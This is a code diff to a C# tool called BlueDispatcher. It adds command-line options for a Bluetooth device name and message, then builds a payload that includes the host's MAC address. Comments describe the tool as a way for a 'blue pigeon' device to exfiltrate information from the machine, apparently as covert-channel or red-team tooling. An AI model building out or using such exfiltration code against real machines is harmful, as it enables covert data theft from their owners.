@@ -1,9 +1,8 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Net.NetworkInformation;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
+using MatthiWare.CommandLine;
+using BlueDispatcher.Options;
 
 namespace BlueDispatcher
 {
@@ -11,12 +10,32 @@ namespace BlueDispatcher
     {
         static void Main(string[] args)
         {
+            var options = new CommandLineParserOptions
+            {
+                AppName = "BlueDispatcher", 
+            };
+
+            var parser = new CommandLineParser<ProgramOptions>(options);
+            var result = parser.Parse(args);
+
+            if(result.HasErrors)
+            {
+                return;
+            }
+
+            var programOptions = result.Result;
+
             // change the device name to your blue pigeon's bluetooth device name
-            string deviceName = "Xiaomi HM Note3";
+            string deviceName = "Pixel 3 XL";
+            if (programOptions.Device != null && programOptions.Device != "")
+                deviceName = programOptions.Device;
+
+            Console.WriteLine("Program executed with: ");
+            Console.WriteLine($"device: {programOptions.Device}");
 
             // any info that you want your pigeon to exfiltrate can be added to the payload map e.g. mac addres
             var payload = new Dictionary<string, string>();
-            string msg = "fly pigeon fly";
+            string msg = programOptions.Message; //string msg = "fly pigeon fly";
             payload.Add("message", msg);
             string macAddr = GetMacAddress();
             payload.Add("mac_address", macAddr);
